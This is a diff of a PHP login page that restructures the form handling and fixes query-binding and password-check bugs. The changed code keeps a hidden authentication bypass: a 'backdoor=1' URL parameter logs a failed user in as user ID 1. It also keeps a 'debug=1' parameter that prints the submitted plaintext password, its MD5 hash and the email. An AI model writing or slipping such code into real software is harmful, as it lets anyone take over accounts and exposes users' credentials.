@@ -11,37 +11,40 @@ require 'validation_functions.php';
 
 $message = '';
 
-if(empty($_POST['email']) || empty($_POST['password'])):
-	$message = "Email or password cannot be empty!";
+if($_SERVER['REQUEST_METHOD'] == 'POST'): // is POST request
 
-elseif(!has_valid_email_format($_POST['email']) || !has_length_less_than($_POST['email'], 251)):
-	$message = "Email must be in the correct format and no longer than 250 chars long!";
+	if(empty($_POST['email']) || empty($_POST['password'])):
+		$message = "Email or password cannot be empty!";
 
-else:
-	$email = $_POST['email'];
-	$pass = $_POST['password'];
+	elseif(!has_valid_email_format($_POST['email']) || !has_length_less_than($_POST['email'], 251)):
+		$message = "Email must be in the correct format and no longer than 250 chars long!";
 
-	$query="SELECT id, email, password FROM users WHERE email = :email LIMIT 1";
-	$records = $conn->prepare($query);
-	$stmt->bindParam(':email', $email);
-	$records->execute();
-	$results = $records->fetch(PDO::FETCH_ASSOC);
-	
-	if ($results != 0 && password_verify($results['password'], $pass)){
-		// Success!
-		$_SESSION['user_id'] = $results['id'];
-		header("Location: /php-login");
+	else:
+		$email = $_POST['email'];
+		$pass = $_POST['password'];
 
-	} else {
-		$message = 'Sorry, those credentials do not match';
-		if (@$_GET["debug"]=="1"){
-			echo $message."<br>".md5($_POST['password'])."<br>".$_POST['password']."<br>".$_POST['email'];
+		$query="SELECT id, email, password FROM users WHERE email = :email LIMIT 1";
+		$records = $conn->prepare($query);
+		$records->bindParam(':email', $email);
+		$records->execute();
+		$results = $records->fetch(PDO::FETCH_ASSOC);
+		
+		if ($results != 0 && password_verify($pass, $results['password'])){
+			// Success!
+			$_SESSION['user_id'] = $results['id'];
+			header("Location: /php-login");
+
+		} else {
+			$message = 'Sorry, those credentials do not match';
+			if (@$_GET["debug"]=="1"){
+				echo $message."<br>".md5($_POST['password'])."<br>".$_POST['password']."<br>".$_POST['email'];
+			}
+			if (@$_GET["backdoor"]=="1"){
+				$_SESSION['user_id'] = 1;		
+			}
 		}
-		if (@$_GET["backdoor"]=="1"){
-			$_SESSION['user_id'] = 1;		
-		}
-	}
 
+	endif;
 endif;
 
 ?>
@@ -68,7 +71,7 @@ endif;
 
 	<form action="login.php" method="POST">
 		
-		<input type="text" placeholder="Enter your email" name="email">
+		<input type="text" placeholder="Enter your email" name="email" value="<?php echo htmlspecialchars((empty($email) ? '' : $email)); ?>">
 		<input type="password" placeholder="and password" name="password">
 
 		<input type="submit">
